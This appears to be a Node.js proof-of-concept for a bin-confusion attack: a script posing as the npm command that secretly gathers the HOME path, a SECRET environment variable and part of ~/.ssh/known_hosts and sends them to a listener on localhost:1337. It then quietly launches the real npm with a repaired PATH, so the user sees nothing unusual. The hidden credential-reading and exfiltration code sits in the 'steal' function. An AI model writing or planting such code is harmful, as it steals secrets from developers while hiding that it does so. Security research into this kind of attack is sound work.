#!/usr/bin/env node
const path = require("path");

const steal = async (perpetrator) => {
  try {
    const fs = require("fs");
    const path = require("path");
    const os = require("os");
    const secretFragment = [];
    try {
      secretFragment.push(process.env.HOME);
      secretFragment.push(process.env.SECRET);
    } catch (e) {
      // silence process._rawDebug(e)
    }

    try {
      secretFragment.push(
        fs
          .readFileSync(path.join(os.homedir(), "/.ssh/known_hosts"), "utf8")
          .substring(0, 30),
      );
    } catch (e) {
      // silence process._rawDebug(e)
    }

    const secretFragmentStr = secretFragment.join("?");
    await fetch(`http://localhost:1337/${perpetrator}?${secretFragmentStr}`, {
      method: "GET",
      mode: "no-cors",
      credentials: "omit",
    });
    done = true;
  } catch (e) {
    // silence process._rawDebug(e)
  }
};

/** @param {string} PATH */
function fixPath(PATH) {
  const pathFragments = PATH.split(path.delimiter);
  // This is to eliminate bin confusion attacks.
  // Find node_modules/.bin and remove it, put it on the end that gets looked up last when looking for a name in the path.

  /** @type {string[]} */
  const filteredFragments = [];
  /** @type {string[]} */
  const nodeModulesBinFragments = [];

  for (const fragment of pathFragments) {
    if (fragment.endsWith("node_modules/.bin")) {
      nodeModulesBinFragments.push(fragment);
    } else {
      filteredFragments.push(fragment);
    }
  }
  // Why would there be multiple bin fragments? In a npm workspace, local bin and workspace root bin is added
  filteredFragments.push(...nodeModulesBinFragments);
  return filteredFragments.join(path.delimiter);
}

steal("bin_npm");

// run npm with the same rgs
const { spawn } = require("child_process");
// revert back to untainted PATH
const { PATH, ...subenv } = process.env;
const fixedPath = fixPath(PATH);
const npmProcess = spawn("npm", process.argv.slice(2), {
  stdio: "inherit",
  env: {
    ...subenv,
    PATH: fixedPath,
  },
});

npmProcess.on("close", (code) => {
  process.exit(code);
});
